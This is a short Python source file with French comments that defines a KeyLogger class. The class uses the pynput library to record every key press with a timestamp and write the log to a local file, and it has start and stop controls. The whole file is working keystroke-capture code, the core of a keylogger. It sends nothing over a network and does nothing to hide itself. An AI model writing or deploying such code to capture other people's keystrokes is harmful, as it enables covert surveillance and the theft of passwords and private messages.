import pynput
from pynput import keyboard
from datetime import datetime

class KeyLogger:
    """
    Classe permettant de créer des keyloggers et de les contrôller
    """
    def __init__(self):
        """
        Un keylogger stock les logs d'inputs reçu dans une liste keys
        """
        self.keys = []
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self,key):
            log = str(datetime.now().time()) + " " + str(key)
            log=log.replace("'","")
            log=log.replace('"',"")
            self.keys.append(log)

    def write_on_file(self,filename):
            with open(filename,'w') as f:
                for key in self.keys:
                    f.write(key)
                    f.write("\n")

    def start(self):
        """
        permet de démarrer le keylogger
        """
        self.listener.start()

    def stop(self):
        """
        permet d'arrêter le keylogger
        """
        self.listener.stop()
